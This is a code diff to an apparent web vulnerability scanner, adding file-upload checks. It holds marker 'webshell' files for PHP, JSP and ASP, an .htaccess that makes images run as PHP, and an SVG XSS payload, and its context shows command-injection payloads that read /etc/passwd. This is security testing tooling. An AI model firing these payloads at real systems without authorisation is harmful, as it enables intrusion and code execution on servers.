@@ -105,6 +105,7 @@ export type WebVulnScanEntry = {
   | { type: "ssrf" }
   | { type: "path-traversal" }
   | { type: "cmdi" }
+  | { type: "file-upload" }
 );
 
 export interface WebVulnFinding {
@@ -380,6 +381,8 @@ export async function runWebVulnScan(config: WebVulnScanConfig): Promise<WebVuln
 type VulnPayload = {
   value: string;
   injectionPoint: "query" | "body" | "header" | "xml-body";
+  fileName?: string;
+  fileContent?: string;
 };
 
 type HarEndpoint = {
@@ -501,6 +504,13 @@ function getPayloadsForVulnType(vulnType: string): VulnPayload[] {
       { value: "`cat /etc/passwd`", injectionPoint: "query" },
       { value: "& cat /etc/passwd", injectionPoint: "query" },
     ],
+    "file-upload": [
+      { value: "webshell.php", injectionPoint: "body", fileName: "test.php", fileContent: "<?php echo 'VULN_UPLOAD_TEST'; ?>" },
+      { value: "webshell.jsp", injectionPoint: "body", fileName: "test.jsp", fileContent: "<% out.print(\"VULN_UPLOAD_TEST\"); %>" },
+      { value: "webshell.asp", injectionPoint: "body", fileName: "test.asp", fileContent: "<% Response.Write(\"VULN_UPLOAD_TEST\") %>" },
+      { value: "htaccess", injectionPoint: "body", fileName: ".htaccess", fileContent: "AddType application/x-httpd-php .jpg" },
+      { value: "svg-xss", injectionPoint: "body", fileName: "test.svg", fileContent: "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS')\"></svg>" },
+    ],
   };
 
   return registry[vulnType] ?? [];
@@ -509,6 +519,61 @@ function getPayloadsForVulnType(vulnType: string): VulnPayload[] {
 function injectPayload(endpoint: HarEndpoint, payload: VulnPayload, vulnType: string): VulnProbeRequest[] {
   const requests: VulnProbeRequest[] = [];
   const headers = normalizeHeaders(endpoint.headers);
+
+  if (payload.fileName && payload.fileContent) {
+    const boundary = `----NullBunnyBoundary${randomUUID().replace(/-/g, "")}`;
+    const parts: Buffer[] = [];
+
+    const bodyText = endpoint.postData?.text;
+    if (bodyText) {
+      const mimeType = endpoint.postData?.mimeType ?? "";
+      if (mimeType.includes("application/x-www-form-urlencoded")) {
+        try {
+          const params = new URLSearchParams(bodyText);
+          for (const [key, val] of params.entries()) {
+            parts.push(Buffer.from(
+              `--${boundary}\r\nContent-Disposition: form-data; name="${key}"\r\n\r\n${val}\r\n`
+            ));
+          }
+        } catch {}
+      } else if (mimeType.includes("application/json")) {
+        try {
+          const parsed = JSON.parse(bodyText) as Record<string, unknown>;
+          for (const [key, val] of Object.entries(parsed)) {
+            if (typeof val === "string") {
+              parts.push(Buffer.from(
+                `--${boundary}\r\nContent-Disposition: form-data; name="${key}"\r\n\r\n${val}\r\n`
+              ));
+            }
+          }
+        } catch {}
+      }
+    }
+
+    parts.push(Buffer.from(
+      `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${payload.fileName}"\r\nContent-Type: application/octet-stream\r\n\r\n${payload.fileContent}\r\n`
+    ));
+    parts.push(Buffer.from(`--${boundary}--\r\n`));
+
+    const body = Buffer.concat(parts).toString("utf-8");
+    requests.push({
+      method: "POST",
+      url: endpoint.url,
+      headers: { ...headers, "content-type": `multipart/form-data; boundary=${boundary}` },
+      body,
+    });
+
+    if (endpoint.method !== "POST") {
+      requests.push({
+        method: endpoint.method,
+        url: endpoint.url,
+        headers: { ...headers, "content-type": `multipart/form-data; boundary=${boundary}` },
+        body,
+      });
+    }
+
+    return requests;
+  }
 
   if (payload.injectionPoint === "xml-body") {
     requests.push({
@@ -731,6 +796,9 @@ function detectVulnerability(vulnType: string, payload: VulnPayload, response: V
   }
   if (vulnType === "cmdi") {
     return detectCmdi(payload, response, baseline);
+  }
+  if (vulnType === "file-upload") {
+    return detectFileUpload(payload, response, baseline);
   }
   return { detected: false, severity: "info", evidence: "", confirmed: false };
 }
@@ -973,6 +1041,41 @@ function detectCmdi(payload: VulnPayload, response: VulnProbeResponse, baseline:
   return { detected: false, severity: "info", evidence: "", confirmed: false };
 }
 
+function detectFileUpload(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
+  if (response.body.includes("VULN_UPLOAD_TEST")) {
+    return {
+      detected: true,
+      severity: "critical",
+      evidence: `Uploaded file executed on server, VULN_UPLOAD_TEST marker found in response`,
+      confirmed: true,
+    };
+  }
+
+  if (response.status === 200 || response.status === 201 || response.status === 204) {
+    const lowerBody = response.body.toLowerCase();
+    const uploadIndicators = ["uploaded", "success", "file saved", "上传成功"];
+    for (const indicator of uploadIndicators) {
+      if (lowerBody.includes(indicator)) {
+        return {
+          detected: true,
+          severity: "high",
+          evidence: `Upload accepted by server (status ${response.status}), response contains "${indicator}"`,
+          confirmed: false,
+        };
+      }
+    }
+
+    return {
+      detected: true,
+      severity: "medium",
+      evidence: `Upload endpoint accepted request (status ${response.status})`,
+      confirmed: false,
+    };
+  }
+
+  return { detected: false, severity: "info", evidence: "", confirmed: false };
+}
+
 function buildVulnReproCurl(request: VulnProbeRequest): string {
   const safeHeaders = sanitizeReproHeaders(request.headers);
   const headerFlags = Object.entries(safeHeaders).flatMap(([key, value]) => [
@@ -1012,7 +1115,7 @@ function isWebVulnScanConfig(value: unknown): value is WebVulnScanConfig {
     return false;
   }
 
-  const validTypes = new Set(["xxe", "xss", "sqli", "ssrf", "path-traversal", "cmdi"]);
+  const validTypes = new Set(["xxe", "xss", "sqli", "ssrf", "path-traversal", "cmdi", "file-upload"]);
   const vulns = (value as any).vulns;
 
   return (
